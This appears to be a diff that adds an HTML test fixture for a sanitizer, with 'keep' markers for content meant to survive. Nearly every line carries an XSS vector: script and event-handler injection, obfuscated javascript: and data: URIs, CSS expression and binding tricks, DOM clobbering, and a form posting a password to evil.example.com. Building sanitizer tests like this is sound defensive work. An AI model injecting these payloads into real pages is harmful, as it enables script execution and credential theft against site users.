@@ -1,0 +1,33 @@
+<p>keep-01 <script>alert(1)</script><SCRIPT src="https://evil.example.com/x.js"></SCRIPT></p>
+<style>body { display: none; }</style><p>keep-02</p>
+<svg><script>alert(2)</script><circle r="5" onload="alert(2)"></circle></svg><p>keep-03</p>
+<math><mi xlink:href="javascript:alert(3)">x</mi><maction actiontype="statusline#http://evil.example.com">y</maction></math><p>keep-04</p>
+<noscript><p title="</noscript><img src=x onerror=alert(4)>">noscript</p></noscript><p>keep-05</p>
+<template><img src="x" onerror="alert(5)"></template><p>keep-06</p>
+<iframe srcdoc="&lt;script&gt;alert(6)&lt;/script&gt;"></iframe><p>keep-07</p>
+<iframe src="https://evil.example.com/embed/x" width="560" height="314"></iframe><p>keep-08</p>
+<iframe src="https://www.youtube.com.evil.com/embed/x"></iframe><p>keep-09</p>
+<iframe src="https://www.youtube.com/watch?v=dQw4w9WgXcQ"></iframe><p>keep-10</p>
+<iframe src="javascript:alert(10)"></iframe><p>keep-11</p>
+<p><iframe src="https://www.youtube-nocookie.com/embed/legitVideo1" width="560" height="314" frameborder="0" allowfullscreen></iframe></p>
+<p onclick="alert(12)" onmouseover="alert(12)">keep-12</p>
+<img src="/ok/a.png" alt="ok-image" onerror="alert(13)" onload="alert(13)"><p>keep-13</p>
+<a href="javascript:alert(14)">js-link</a> <a href="JaVaScRiPt:alert(14)">mixed-case</a> <a href="&#106;avascript:alert(14)">entity</a> <a href="&#x6A;&#x61;vascript&#58;alert(14)">hex-entity</a> <a href="java	script:alert(14)">tab-split</a> <a href="java&#10;script:alert(14)">newline-split</a> <a href=" javascript:alert(14)">leading-space</a><p>keep-14</p>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxNSk8L3NjcmlwdD4=">data-link</a> <img src="data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;" alt="data-html"> <img src="data:image/png;base64,iVBORw0KGgo=" alt="data-image"><p>keep-15</p>
+<a href="vbscript:msgbox(16)">vbs</a> <img src="vbscript:msgbox(16)" alt="vbs-img"><img src="mailto:x@example.com" alt="mailto-img"><p>keep-16</p>
+<base href="https://evil.example.com/"><meta http-equiv="refresh" content="0;url=https://evil.example.com/"><p>keep-17</p>
+<form action="https://evil.example.com/steal" method="post"><input type="text" name="password" value="x"><input type="hidden" name="csrf" value="y"><button type="submit" formaction="javascript:alert(18)">go</button><textarea name="t">t</textarea><select name="s"><option>o</option></select></form><p>keep-18</p>
+<input type="text" name="pw" autofocus onfocus="alert(19)"><input type="password" name="pw2"><input name="untyped"><p>keep-19</p>
+<input type="checkbox" id="acc9" onclick="alert(20)" checked><label for="acc9" onclick="alert(20)">accordion-label</label><p>keep-20</p>
+<object data="https://evil.example.com/x.swf"><param name="movie" value="x"></object><embed src="https://evil.example.com/x.swf"><p>keep-21</p>
+<link rel="stylesheet" href="https://evil.example.com/x.css"><p>keep-22</p>
+<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999;">fixed-overlay</div><p>keep-23</p>
+<div style="background: url(javascript:alert(24)); color: red;">bg-js</div><div style="background-image: url('javascript:alert(24)'); color: blue;">bg-image-js</div><p>keep-24</p>
+<div style="background-image: url(&quot;data:image/svg+xml;base64,PHN2Zz4=&quot;); color: green;">bg-data</div><p>keep-25</p>
+<div style="width: expression(alert(26)); color: #123456;">expr</div><div style="behavior: url(x.htc); -moz-binding: url(https://evil.example.com/x.xml#y); color: #654321;">binding</div><p>keep-26</p>
+<div style="@import url(https://evil.example.com/x.css); color: #abcdef;">import</div><p>keep-27</p>
+<div style="position: absolute; z-index: 99999999; color: #fedcba;">z-index</div><p>keep-28</p>
+<p id="document">clobber-document</p><p id="__proto__">clobber-proto</p><p id="location">clobber-location</p><p id="safe-id">safe-id-kept</p><p>keep-29</p>
+<a href="/relative/ok" target="_blank" rel="noopener">relative-link</a> <a href="https://example.com/ok">https-link</a> <a href="mailto:shop@example.com">mail-link</a> <a href="tel:+886-2-1234-5678">tel-link</a><p>keep-30</p>
+<p>keep-31 <img src="/ok/b.png" alt="x" onerror="alert(31)"</p>
+<p>keep-32</p><p title="x" class="ok-class" onmouseover='alert(32)"'>quote-trick</p><img src="/ok/c.png" alt="unterminated quote onerror="alert(32)>
